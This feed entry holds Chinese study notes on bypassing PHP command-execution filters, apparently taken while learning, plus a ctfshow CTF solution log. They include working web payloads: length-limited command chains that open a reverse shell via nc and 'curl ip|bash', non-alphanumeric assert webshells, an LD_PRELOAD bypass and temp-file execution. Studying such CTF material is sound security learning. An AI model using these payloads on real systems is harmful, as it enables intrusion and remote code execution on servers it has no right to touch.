    <content type="html"><![CDATA[<h2 id="命令执行危险函数认识"><a href="#命令执行危险函数认识" class="headerlink" title="命令执行危险函数认识"></a>命令执行危险函数认识</h2><ul><li><p>php -r php代码 如果靶机中有php环境 那么就能使用这个代码来执行php代码 代码里可以继续套娃一些命令执行函数 而且对于php来说 ();等符号不会受到\的转义效果影响</p></li><li><p>system()</p><ul><li>执行外部程序  并且显示输出</li></ul></li><li><p>exec(string $command,array $output【<strong>可选</strong>】)</p><ul><li>执行外部程序 将输出储存到数组$output里</li></ul></li><li><p>passthru()</p><ul><li>执行外部程序 并且显示原始输出</li></ul></li><li><p>shell_exec()</p><ul><li>通过shell环境执行命令，并且将完整的输出以字符串的形式返回，但这个返回不是返回到页面上 而是比如说$output &#x3D; shell_exec(ls)</li><li>要通过 echo $output 才能输出到页面上</li></ul></li><li><p>popen($cmd,’r’)</p><ul><li><code>$ben = popen($cmd,&#39;r&#39;);</code><br><code>while($s=fgets($ben))&#123;</code><br>      <code>print_r($s);</code><br><code>&#125;</code></li><li>popen函数打开了一个进程文件指针 执行了$cmd</li><li>然后通过fgets函数逐行读取他的输出</li><li>然后将输出通过print_r输出到页面</li></ul></li><li><p>proc_open()</p><ul><li><p>$cmd &#x3D; $_GET[“cmd”]; &#x2F;&#x2F; 通过 GET 请求获取命令<br>$array &#x3D; array(<br>array(“pipe”, “r”),    &#x2F;&#x2F; 标准输入<br>array(“pipe”, “w”),    &#x2F;&#x2F; 标准输出内容<br>array(“file”, “&#x2F;tmp&#x2F;error-output.txt”, “a”) &#x2F;&#x2F; 标准输出错误<br>);</p><p>$fp &#x3D; proc_open($cmd, $array, $pipes);   &#x2F;&#x2F; 打开一个进程通道<br>echo stream_get_contents($pipes[1]);    &#x2F;&#x2F; 输出命令的标准输出内容<br>proc_close($fp);    &#x2F;&#x2F; 关闭进程通道</p></li><li><p>上面的数组是标准的写法 分别是输入 输出 报错内容</p></li><li><p>下面 是打开一个进程通道 执行传递的命令 并且返回一个资源指针$fp和一个文件指针数组$pipes</p></li><li><p>最后通过stream_get_contents读取输出</p></li><li><p>然后用echo输出 最后关闭进程通道</p></li></ul></li><li><p>反引号</p><ul><li>反引号能直接执行命令</li><li>比如 <code>$cmd</code></li><li>不过需要echo才能输出到页面</li></ul></li><li><p>pcntl_exec</p><ul><li>这个函数是php中的一个扩展函数</li><li>$binary&#x3D;””&#x2F;&#x2F;可执行文件的路径</li><li>$args&#x3D;[“””””]&#x2F;&#x2F;参照数组</li><li>pcntl_exec($binary,$args);</li><li>echo”xx”;</li><li>这个函数的功能是 用于替换当前进程的映象 并且执行新的程序</li><li>所以如果他执行成功 就不会有echo 失败的话 echo就会继续执行</li><li>新的进程就是调用的那个文件和参数数组</li></ul></li></ul><h2 id="LD-PRELOAD绕过原理介绍"><a href="#LD-PRELOAD绕过原理介绍" class="headerlink" title="LD_PRELOAD绕过原理介绍"></a>LD_PRELOAD绕过原理介绍</h2><ul><li>mail 函数 <ul><li>内嵌在php里</li><li>先vim demo.php<ul><li>里面写入mail(“,”,”,”)</li><li>然后用strace -o 1.txt -f php demo.php</li><li>这一句是用文档的形式记录我php demo.php 执行的内容</li><li>然后用cat 1.txt | grep execve </li><li>这一句是 检查有哪些是执行文件被调用里</li><li>发现里面有sendmail这个文件</li><li>使用readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail</li><li>然后发现一个 geteuid 函数</li><li>这个时候我们编辑一个库文件 demo.c</li><li>void payload(){</li><li>system(“echo ‘xx’  “)</li><li>}</li><li>int geteuid(){<ul><li>unsetenv(“LD_PRELOAD”);</li><li>payload();</li></ul></li><li>} 然后把这个文件编译成.so文件 生成动态链接库文件</li><li>gcc -shared -fPIC demo.c -o demo.so</li><li>然后把一开始那个demo.php在开头加上一行</li><li>putenv(“LD_PRELOAD&#x3D;.&#x2F;demo.so”)；</li><li>表示执行前先加载这个库文件</li></ul></li><li>绕过条件<ul><li>能够上传自己的.so文件</li><li>能够设置LD_PRELOAD变量的值，比如putenv函数并且未被禁止</li><li>存在可以控制php启动外部程序的函数并且能够执行</li><li>因为新的进程会加载LD_PRELOAD中的.so文件</li><li>比如mail（）等</li></ul></li></ul></li><li>imagick<ul><li>需要扩展安装</li></ul></li></ul><h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><ul><li>；<ul><li>用分号链接 前后都能执行 而且前面命令正确与否都不影响后面命令的执行</li></ul></li><li>&amp;<ul><li>提交后必须要url编码</li><li>而且前面命令不影响后面的执行</li></ul></li><li>两个$<ul><li>如果前面的命令执行成功，才能执行后面的</li><li>如果前面不成功，则两条都无法执行</li></ul></li><li>|<ul><li>把前面命令的结果 作为 | 后面命令的参数</li><li>然后执行后面的命令</li></ul></li><li>||<ul><li>类似于if else语句</li><li>如果前面的命令执行成功，则后面的命令不再执行</li><li>反之执行后面的命令</li></ul></li></ul><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><ul><li>大括号{}<ul><li>{cat,flag.txt} 第一个作为命令，第二个作为参数</li></ul></li><li>使用$IFS ${IFS} $IFS$9</li><li>重定向字符&lt;,&lt;&gt;;<ul><li>&lt;表示的是输入重定向的意思，就是把&lt;后面的文件取代键盘成为新的输入设备</li></ul></li><li>%09 TAB %20 SPACE</li></ul><h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><ul><li>?代表单个字符，前提是这个字符要存在<ul><li>比如flag.php 可以写成????.???</li></ul></li><li>*代表任意字符<ul><li>比如f*.php *</li></ul></li><li>单双引号<ul><li>比如fla””g.p””hp 或者fla’’g.p’’hp</li></ul></li><li>\ 反斜线<ul><li>比如 fla\g.ph\p</li><li>\在Linux里是命令连接符</li></ul></li><li>特殊变量<ul><li>比如$1到$9、$@和$*等</li><li>因为他们的输出都为空</li></ul></li><li>内联执行<ul><li>定义变量 比如$a&#x3D;f;</li><li>然后cat $alag.php</li></ul></li><li>环境变量<ul><li>${PATH:5:1}</li><li>意思是使用环境变量PATH里的第五个字符里的第一位</li><li>从0开始数</li></ul></li></ul><h2 id="文件读取命令的绕过"><a href="#文件读取命令的绕过" class="headerlink" title="文件读取命令的绕过"></a>文件读取命令的绕过</h2><ul><li><p>hexdump -C fimename 能用十六进制的形式读取内容</p></li><li><p>tac 反向显示</p></li><li><p>more 一页一页显示 在linux里按空格翻页</p></li><li><p>less 与more 相似</p></li><li><p>tail 查看末尾几行 最多十行</p></li><li><p>nl 显示的时候 顺便输出行号</p></li><li><p>od 二进制的方式读取</p></li><li><p>xxd 读取二进制文件</p></li><li><p>sort 主要用来排序文件</p></li><li><p>uniq 报告或删除文件中重复的行</p></li><li><p>file -f 报错出具体内容</p></li><li><p>grep </p><ul><li>grep 搜索的字符 匹配的文件</li><li>grep { fla*.php</li></ul></li></ul><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul><li>base64编码</li><li>echo base64编码后的字符串 | base64 -d | &#x2F;bin&#x2F;bash  最后一项有很多能用的 比如直接bash 或者sh<ul><li>?cmd&#x3D;passthru(‘echo “Y2F0IGZsYWcucGhw”|base64 -d |bash’);</li></ul></li><li>base32编码<br>-HEX编码 即ASCII编码<br> -echo 编码后字符串 | xxd -r -p | &#x2F;bin&#x2F;bash<ul><li>?cmd&#x3D;passthru(‘echo “74616320666c61672e706870”|xxd -r -p|bash’);</li></ul></li><li>shellcode编码</li><li>shellcode是ASCII编码用&#x2F;x来表示</li><li>这里用printf替代echo即可</li><li>hex2bin函数解码</li></ul><h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><ul><li>sleep 3<ul><li>表示三秒之后再执行</li></ul></li><li>awk NR&#x3D;&#x3D;1</li><li>表示返回第一行的结果</li><li>cut -c 1</li><li>表示返回第一个字符的结果</li><li>if语句</li><li>if []；then ；fi</li><li>表示[]里面是判断 ，如果真就执行then后面的语句 假就fi 注意if和[]中间要用空格隔开</li><li>if [$(cat flag | awk NR&#x3D;&#x3D;1 | cut -c 1)&#x3D;&#x3D;a];then echo “right”;fi</li><li>可以用python写一个脚本跑值 类似于sql盲注的思路</li></ul><h2 id="长度过滤绕过前置知识"><a href="#长度过滤绕过前置知识" class="headerlink" title="长度过滤绕过前置知识"></a>长度过滤绕过前置知识</h2><ul><li><blockquote></blockquote></li><li><p>例如 echo dada &gt; a</p></li><li><p>就会把dada写到a里面 如果还是一个大于号写入值 就会覆盖原有的内容 可以用两个大于号去新增内容</p></li><li><p>使用&gt;&gt;追加内容</p></li><li><p>使用&#x2F;进行命令换行 上面提到过 就是命令链接的作用</p></li><li><p>ls-t</p></li><li><p>表示先近后远的按照时间来排序</p></li><li><p>但要注意不能复制粘贴 一下生成几个文件 这样用时间排序是会出错的</p></li><li><p>可以利用&gt;写很多个文件 只有名字那种 然后用ls -t 会发现 结果是一个有用的排序 比如 cat \ flag这种形式 中间可以多用几个\链接 然后把这个ls -t的结果&gt;某个文件里 然后. 这个文件 就可以执行了</p></li><li><p>然后就能读出flag的值里</p></li><li><p>sh执行 或者. 执行是一样的</p></li><li><p>dir * </p></li><li><p>把第一个文件的文件名作为命令 第二个或者后面的作为参数 来执行</p></li><li><p>比如说 cat 然后 flag.php</p></li><li><p>rev 可以反过来显示文件的内容</p></li><li><p>123 显示成 321</p></li></ul><h2 id="长度为7的绕过方法"><a href="#长度为7的绕过方法" class="headerlink" title="长度为7的绕过方法"></a>长度为7的绕过方法</h2><ul><li><p>先构造期望执行的指令</p></li><li><p>cat flag|nc ip 端口号</p></li><li><p>思路</p></li><li><p>利用 &gt; 创造很短的文件名</p></li><li><p>ls -t 按照时间排序列出文件名，按行存储</p></li><li><p>\连接换行命令</p></li><li><p>sh从文件中读取命令</p></li><li><p>具体内容</p></li><li><blockquote><p>ca\</p></blockquote></li><li><blockquote><p>t\ \</p></blockquote></li><li><blockquote><p>flag\</p></blockquote></li><li><blockquote><p>|n\</p></blockquote></li><li><blockquote><p>c\ \</p></blockquote></li><li><p>ip</p></li><li><p>端口</p></li><li><p>注意文件名不能重复</p></li><li><p>ls -t&gt;a</p></li><li><p>sh a即可反弹shell</p></li><li><p>也可以写Python脚本执行</p></li></ul><h2 id="长度为5的绕过"><a href="#长度为5的绕过" class="headerlink" title="长度为5的绕过"></a>长度为5的绕过</h2><ul><li><p>期望执行指令</p></li><li><p>curl ip|bash</p></li><li><p>利用这个 在这个ip的index.html下写好nc ip 端口 -e &#x2F;bin&#x2F;bash</p></li><li><p>第一步 构造ls -t&gt;y</p></li><li><blockquote><p>ls\</p></blockquote></li><li><p>再创建文件 ls&gt;_</p></li><li><blockquote><p>\ \ </p></blockquote></li><li><blockquote><p>-t\</p></blockquote></li><li><blockquote><p>&gt;y</p></blockquote></li><li><p>然后ls&gt;&gt;_</p></li><li><p>sh _即可实现ls -t</p></li><li><p>然后再把期待执行的指令给写进去 先不用sh _</p></li><li><p>全写完再执行 sh _ sh y</p></li></ul><h2 id="长度为4的绕过"><a href="#长度为4的绕过" class="headerlink" title="长度为4的绕过"></a>长度为4的绕过</h2><ul><li><p>这里新的问题是 追加到_用不了了</p></li><li><p>仍要先构造ls -t&gt;g</p></li><li><p>这里用到dir 和rev 一个是一行内展示文件 另一个是倒序</p></li><li><p>先构造ls -t&gt;g</p></li><li><blockquote><p>g&gt;</p></blockquote></li><li><blockquote><p>t-</p></blockquote></li><li><blockquote><p>sl</p></blockquote></li><li><blockquote><p>dir</p></blockquote></li><li><p>在-t后面加h，不影响命令执行 但可以改变顺序</p></li><li><p>如果敲一个*号</p></li><li><p>就会执行第一个文件名的命令 把后面的当做参数</p></li><li><p>因为第一个是dir 所以就是dir 列出后面的文件名</p></li><li><p>*&gt;v 这样v就是那些排序</p></li><li><p>这时候rev v 就能把v倒序排列</p></li><li><p>rev 可以用 * 代替</p></li><li><p>所以 牛逼的就是 *v&gt;x</p></li><li><p>注意点 为了防止g后面有其他文件名影响 可以多创建一个文件 g;</p></li><li><p>然后构造反弹shell 和上面一样是curl ip|bash 不过ip要用16进制来写</p></li><li><p>利用文件包含漏洞</p></li><li><p>先是c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;&#x2F;etc&#x2F;passwd</p></li><li><p>表示包含一个参数1 然后对1进行定义 这里因为分号被过滤 不过最后一个分号不用写  然后1的包含 如果是flag无法输出 所以用php一个伪协议 然后base64 decode 就行</p></li><li><p>include 可以用 require 代替</p></li><li><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("mv fla?.php 1.txt");?></p><ul><li>data为协议</li></ul></li></ul><h2 id="无参数命令执行请求头绕过"><a href="#无参数命令执行请求头绕过" class="headerlink" title="无参数命令执行请求头绕过"></a>无参数命令执行请求头绕过</h2><ul><li><p>php7.3</p></li><li><p>条件是一个正则表达式 过滤掉所有的 a() 形式 以及R表示递归 所以a(b())等等都会被过滤 但例题中要求过滤完只剩下一个分号 所以我们的payload就只能是这种形式 所以叫做无参数</p></li><li><p>getallheaders()这个函数是获得所有的http请求头的内容 不过需要print_r 才能打印到页面</p></li><li><p>可以使用bp 更方便改包发包</p></li><li><p>注意点 我们bp里拦截下来的请求头的值 和 print_r打印到页面里的顺序是相反的</p></li><li><p>所以我们可以修改某个项的内容 来进行命令执行</p></li><li><p>pos()函数 把第一项的内容显示出来</p></li><li><p>end() 和pos相反</p></li><li><p>比如我们可以把最后一项 的值 改成 system(‘ls’)；</p></li><li><p>然后eval(pos(getallheaders()))</p></li><li><p>还有一个 apache_request_header 作用和getallheaders相似 不过只能在Apache使用</p></li></ul><h2 id="无参数命令执行之全局变量RCE"><a href="#无参数命令执行之全局变量RCE" class="headerlink" title="无参数命令执行之全局变量RCE"></a>无参数命令执行之全局变量RCE</h2><ul><li>PHP5&#x2F;7</li><li>get_defined_vars() 返回所有已定义变量的值所组成的数组</li><li>返回数组的顺序是 GET-&gt;POST-&gt;COOKIE-&gt;FILES</li><li>pos end 仍然可以用</li><li>还能用&amp;加上别的指令 比如&amp;cmd&#x3D;system(‘ls’);</li><li>而且实际上这样写进去是分成两行的 所以能用end 取出第二个 就是cmd的值</li><li>eval同样能用 还有assert</li><li>python脚本</li></ul><h2 id="无参数命令执行之sessionRCE"><a href="#无参数命令执行之sessionRCE" class="headerlink" title="无参数命令执行之sessionRCE"></a>无参数命令执行之sessionRCE</h2><ul><li>php5</li><li>session_start() 启动新会话或者重用现有回话 返回值只有1或者0</li><li>session_id(session_start)  这样请求头的cookie里面就要sessionid这一项里 而且值很长 对方也能接收到</li><li>所以例题里面 get传参就写 session_id(session_start()) 然后bp拦截 修改cookie里sessionid的值就行</li><li>print_r修改为show_source()</li><li>sessionid改为.&#x2F;flag 配合上一行 就能读取值了</li><li>如果是eval的话 里面phpsessionid的值就要用hex编码变成16进制 </li><li>外面再用hex2bin()函数转换成2进制 然后eval执行</li></ul><h2 id="无参数命令执行之scandir读取"><a href="#无参数命令执行之scandir读取" class="headerlink" title="无参数命令执行之scandir读取"></a>无参数命令执行之scandir读取</h2><ul><li>scandir() <ul><li>列出指定路径中的文件和目录</li><li>类似ls</li></ul></li><li>getcwd()<ul><li>取得当前工作目录 </li><li>类似pwd</li></ul></li><li>current()<ul><li>返回数组中的当前值</li><li>好像就是第一个值</li></ul></li><li>array_reverse()<ul><li>返回顺序相反的数组</li></ul></li><li>array_filp()<ul><li>把键值对互换</li></ul></li><li>next()<ul><li>将数组中的内部指针向前移动</li></ul></li><li>array_rand()<ul><li>从数组中随机取出一个或者多个键</li></ul></li><li>chdir()<ul><li>和cd类似 用于改变当前工作目录</li></ul></li><li>strrev()<ul><li>用于反转给定的字符串</li></ul></li><li>crypt()<ul><li>用来加密</li></ul></li><li>hebrevc()<ul><li>转换流的方向</li></ul></li><li>localeconv()<ul><li>显示的数组第一项是.</li><li>所以可以利用这个函数 加上current scandir print_r 读取当前目录下的文件名</li><li>show_source current 加上上面的 就能查看文件里</li></ul></li><li>查看上级目录的文件<ul><li>dirname(getcwd()) 显示上一级目录路径</li><li>但是我们需要使用chdir来修改执行目录<ul><li>chidir(dirname(getcwd()))</li><li>这里不太懂 还要再研究一下</li></ul></li></ul></li><li>根目录<ul><li>用serialize(array())序列化一个数组</li><li>然后crypt加密</li><li>strrev倒序 如果倒序后第一个是斜杆 可以chr ord 互转 因为他们只对第一个字符起作用 所以只剩一个字符</li><li>就有可能获取到斜杆</li><li>可以利用bp爆破 获取某个特定文件内容 不过还需要多研究</li></ul></li></ul><h2 id="无字母数字-异或运算绕过"><a href="#无字母数字-异或运算绕过" class="headerlink" title="无字母数字-异或运算绕过"></a>无字母数字-异或运算绕过</h2><ul><li>原理 echo base_convert(bin2hex(‘5’),16,2) &#x3D; 00110101<ul><li>这是输出5的2进制</li></ul></li><li>然后同理把别的字符也转换成2进制<ul><li>之后两个2进制字符串进行逐位异或运算</li><li>然后反过来解码 得到正常字符 比如5和Z能生成o</li></ul></li><li>所以我们可以利用php脚本来构造我们想要的payload 通过既不是字母也不是数字的特殊字符</li><li>异或运算符是 ^ 比如 “5”^”Z”</li><li>在例题中 ?cmd&#x3D;$_&#x3D;””^””;$-();<ul><li>后面那个是下划线 makedown不好写 记得要url编码</li><li>这边的例子是先用poc构造一个phpinfo 然后$_&#x3D;字符串异或字符串 分号<ul><li>也就是$_&#x3D;phpinfo 然后再来一个$-(); 这样就能执行phpinfo()；了</li><li>看懂掌声..</li></ul></li></ul></li><li>下面说5的 7可以用反引号包裹 <code>$_POST[-]</code>;不过不能回显 <ul><li>assert($_POST[‘-‘])</li><li>这个类似一句话木马</li><li>构造方法<ul><li>$a&#x3D;’assert’;</li><li>$b&#x3D;’_POST’;</li><li>$c&#x3D;$$b;</li><li>$a($c[‘_’]);</li></ul></li><li>把 a b c 换成下划线 两个下划线 三个下划线 别的用异或运算替换掉即可<ul><li>$_&#x3D;”!((%)(“^”@[[@[&quot;</li><li>$__&#x3D;”!+&#x2F;((“^”~{&#96;{|”</li><li><code>$___=$$__</code></li><li><code>$_($$__[&#39;_&#39;]);</code></li><li>所以到例中的payload如下</li><li><code>$_=&quot;!((%)(&quot;^&quot;@[[@[\&quot;；$__=&quot;!+/((&quot;^&quot;~&#123;</code>{|”；$<em><strong>&#x3D;$$</strong>；$</em>($_<em>[‘</em>‘]);&#96;照理来说是没错 但不懂为啥没成功</li></ul></li><li>可以nc反弹shell 如果是反引号不回显的话</li><li>这边这种无字母数字的靶场<ul><li>方法都一样 先取决于版本 然后通过不同过滤使用不同方法 </li><li><code>?cmd=$_=；$__=；$___=$$__；$_($___[_]);</code></li><li></li></ul></li></ul></li></ul><h2 id="无字母数字-取反绕过"><a href="#无字母数字-取反绕过" class="headerlink" title="无字母数字-取反绕过"></a>无字母数字-取反绕过</h2><ul><li>~() 通过这个取反</li><li>0b0110 变成 0b1001</li><li>这编主要还是利用脚本来构造payload</li><li>构造的payload和上面一样 不过所用到的原理不同</li><li>一个中文分号拦我一个点 坠了</li><li><code>$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</code></li></ul><h2 id="无字母数字-自增绕过"><a href="#无字母数字-自增绕过" class="headerlink" title="无字母数字-自增绕过"></a>无字母数字-自增绕过</h2><ul><li>通过++自增 <ul><li>a++是先a再++</li><li>++a是先++再输出a</li></ul></li><li>所以可以先<ul><li>$a&#x3D;A;</li><li>++$a;++$a;++$a;++$a;</li><li>echo $a;</li><li>这样a的值就是E了</li></ul></li><li>通过$_&#x3D;[].’’<ul><li>echo $_[0];</li><li>这样第一位就是A了</li></ul></li><li>0可以用不存在的变量来替换 比如$__</li><li>因为不存在是false所以他的值是0</li><li>通过赋值 自增 拼接 再赋值 自增 拼接 就可以构造payload了</li><li>.&#x3D; 是拼接的作用</li></ul><h2 id="无字母数字特殊符号绕过"><a href="#无字母数字特殊符号绕过" class="headerlink" title="无字母数字特殊符号绕过"></a>无字母数字特殊符号绕过</h2><ul><li>短标签&#x3D;代替php</li><li>下划线和$被过滤<ul><li>php7</li><li>($a)()</li><li>call_user_func()</li><li>(call_user_func)(system,whoami,’’) 取反</li><li>php5</li><li>文件读取 </li><li>因为php中post上传文件的时候 文件会临时存到tmp目录下 默认文件名是phpXXXXXX x是随机的</li><li>所以能用通配符？来匹配</li><li>.&#x2F;???&#x2F;?????[@-[]这个表示ASCII在@和[之间的字符 也就是大写字母 来保证最后一位是大写的字母</li><li>所以通过上传一句话木马 然后.&#x2F;会执行</li></ul></li></ul><h2 id="ctfshow命令执行解题记录"><a href="#ctfshow命令执行解题记录" class="headerlink" title="ctfshow命令执行解题记录"></a>ctfshow命令执行解题记录</h2><ul><li><p>ctfshow web40</p><ul><li>这一题有多种方法 </li><li>一个是打印出全局变量 发现使用next 能移动到POST的值 所以post里写命令执行函数</li><li>然后GET传参里写?c&#x3D;eval(array_pop(next(get_defined_vars())));</li><li>还有就是session也能用</li><li>然后show_source(next(array_reverse(scandir(pos(localeconv())))));也能用</li><li>var_dump() 可以代替print_f</li><li>思路就是先查看当前目录下文件有哪些 再想办法读取到</li></ul></li><li><p>web41</p><ul><li>&amp; 按位与 |按位或 ^ 按位异或 ~取反 为四大位运算符</li><li>这一题是需要用或运算 就是 |</li><li>然后php中 大小写都能算合法的函数写法</li><li>且 (‘phpinfo’)(); 这样也是合法的</li></ul></li><li><p>web42</p><ul><li>题目把我们的传参拼接了&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</li><li>代表标准输出给到一个黑洞里 错误输出和标准输出一样</li><li>可以使用||来绕过 表示执行前面的成功了 就不执行后面的了</li><li>也可以双写绕过 ls;ls 用分号隔开了 表示后面的ls和拼接的代码单独执行</li></ul></li><li><p>web43</p><ul><li>这题可以用||和&amp;&amp; 需要注意的是&amp;&amp;是第一条成功执行后执行下一条 但是他要url编码后提交 因为它是由特殊含义的</li></ul></li><li><p>web46</p><ul><li>这里有个注意点</li><li>为什么%09 这个tab符号 如果过滤了数字 他不会被过滤呢</li><li>因为数字解码之后是大于0x30的 制表符不属于那个范围</li><li>%0a表示换行 09是tab 20是空格</li><li>nl可以代替tac 不过要看源代码 所以应该是代替cat</li></ul></li><li><p>web52</p><ul><li>这里发现当前目录没有flag</li><li>所以去根目录找一下 ls &#x2F; 列出根目录的文件名</li><li>然后通过cp复制到别的地方</li><li>cp${IFS}&#x2F;fl’’ag${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt||</li></ul></li><li><p>web54</p><ul><li>这题目过滤的特别多 但是没过滤mv</li><li>可以进行重命名</li><li>mv flag.php a.txt</li><li>?c&#x3D;&#x2F;bin&#x2F;c??${IFS}????.???这个也可以<ul><li>因为如果写c??的话没法匹配到cat</li><li>只有&#x2F;bin&#x2F;ca？这样才能匹配得到</li></ul></li><li>cp啥的好像也行</li></ul></li><li><p>web55</p><ul><li><p>这题解法蛮多的 属于无字母特殊符号的题目</p></li><li><p>一个是用&#x2F;bin目录下的可执行程序</p><ul><li>&#x2F;bin&#x2F;base64 flag.php</li><li>替换后是&#x2F;???&#x2F;????64 ????.???</li></ul></li><li><p>还有一种是bash执行 使用八进制和ascii转换</p><ul><li><pre><code class="hljs">$&#39;\154\163&#39;这个会执行ls 因为154是八进制 他的十进制是l对应的ascii位置<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">   -</span> 所以能用这个执行cat flag.php<br><br><span class="hljs-bullet">   -</span> <br><br><span class="hljs-bullet">-</span> 这一段表示cat *<br><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>&#x2F;?c&#x3D;$’\143\141\164’%20*</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><br><br><span class="hljs-bullet">-</span> 然后这一题还有一个姿势<br><br><span class="hljs-bullet">  -</span> 通过.来执行文件<br><span class="hljs-bullet">  -</span> 然后我们可以构造一个表单 对这个服务器上传php文件<br><span class="hljs-bullet">  -</span> php文件会临时存放在/tmp/php 后面有六个随机字符 不过最后一个是大写 可以用[@[]来匹配大写 原因上面的笔记讲过了<br><span class="hljs-bullet">  -</span> 所以可以用bp抓包 文件内容是#!/bin/sh然后换行写payload 然后传参是.%20/???/????????[@-[]<br><span class="hljs-bullet">  -</span> 1.txt里面直接写ls才能成功不懂为啥<br><br><span class="hljs-bullet">-</span> web57<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`$(())`</span> ：代表做一次运算<br><br><span class="hljs-bullet">  -</span> 因为里面是空的 所以值为零 运算出来结果也是零<br><br><span class="hljs-bullet">  -</span> 然后对零取反运算 结果是-1<br><br><span class="hljs-bullet">  -</span> $(( ~$(()) ))<br><br><span class="hljs-bullet">  -</span> 连着写两个就是-1-1=-2<br><br><span class="hljs-bullet">  -</span> -2取反得到1<br><br><span class="hljs-bullet">  -</span> 如果得到-37 那么取反就是36 <br><br><span class="hljs-bullet">  -</span> 所以在$(( ~$((    这里面放37个-1 也就是$((~$(())))   )) )) 然后外面那个~取反 也就是36<br><br><span class="hljs-bullet">  -</span> 可以通过python更快构造payload<br><br><span class="hljs-bullet">  -</span> <br><br>  - <span class="hljs-code">```python</span><br><span class="hljs-code">    get_reverse_number = &quot;$((~$((&#123;&#125;))))&quot; # 取反操作</span><br><span class="hljs-code">    negative_one = &quot;$((~$(())))&quot;# -1</span><br><span class="hljs-code">    payload = get_reverse_number.format(negative_one*37)</span><br><span class="hljs-code">    print(payload)</span><br></code></pre></td></tr></table></figure></li><li><p>web59</p><ul><li>c&#x3D;highlight_file(“flag.php”);</li><li>show-source</li><li>include require 也能试试</li><li>readgzfile</li></ul></li><li><p>web62</p><ul><li>print_r(scandir(dirname(‘FILE’)));</li><li>这个用来扫描目录</li><li>var_dump代替print_r</li><li>var_export</li><li>：?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</li></ul></li><li><p>web71</p><ul><li><p>遇到缓冲区</p></li><li><p>可以使用</p></li><li></li><li><pre><code class="language-php">ob_flush();ob_end_flush();exit();die();</code></pre></li></ul></li><li><p>web72</p><ul><li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}exit(0);</li><li>使用这个payload可以扫描根目录下的所有文件</li></ul></li><li><p>web75</p><ul><li>先扫描目录发现flag文件</li><li>然后使用mysql的pdo读取</li><li>c&#x3D;try {$dbh &#x3D; new PDO(‘mysql:host&#x3D;localhost;dbname&#x3D;ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“&#x2F;flag36d.txt”)’) as $row){echo($row[0]).”|”; }$dbh &#x3D; null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);</li><li>但这里我读取没成功</li><li>load_file<ul><li>读取一个文件并且将其内容作为字符串返回</li></ul></li><li>pdo 数据库访问接口</li></ul></li><li><p>web77</p><ul><li>这一题是php7.4版本</li><li>c&#x3D;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);$a&#x3D;’&#x2F;readflag &gt; 1.txt’;$ffi-&gt;system($a);</li><li>&#96;&#96;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);  &#x2F;&#x2F;创建一个system对象<code> </code>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;  &#x2F;&#x2F;因为页面不会回显，所以将内容输出到1.txt<code> $ffi-&gt;system($a);  //通过$ffi去调用system函数</code></li></ul></li><li><p>web118</p><ul><li>这一题查看提示的png图片</li><li>发现pwd里面有l</li><li>环境变量bin有n</li><li>所以可以构造nl 又因为提示flag.php 可以用????.???代替</li><li>所以构造 ${PATH:<del>A}${PWD:</del>A}$IFS????.???</li></ul></li><li><p>web119</p><ul><li><p>同样是通过各种方法</p></li><li><p>构造出&#x2F;bin&#x2F;cat flag.php</p></li><li><p>0：$、$:$} &#x3D; {${PWD}:0:1} &#x3D; &#x2F;</p><p>${PWD:${SHLVL}:$</p></li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化总结</title>
    <link href="/2024/01/12/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/12/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</url>
    
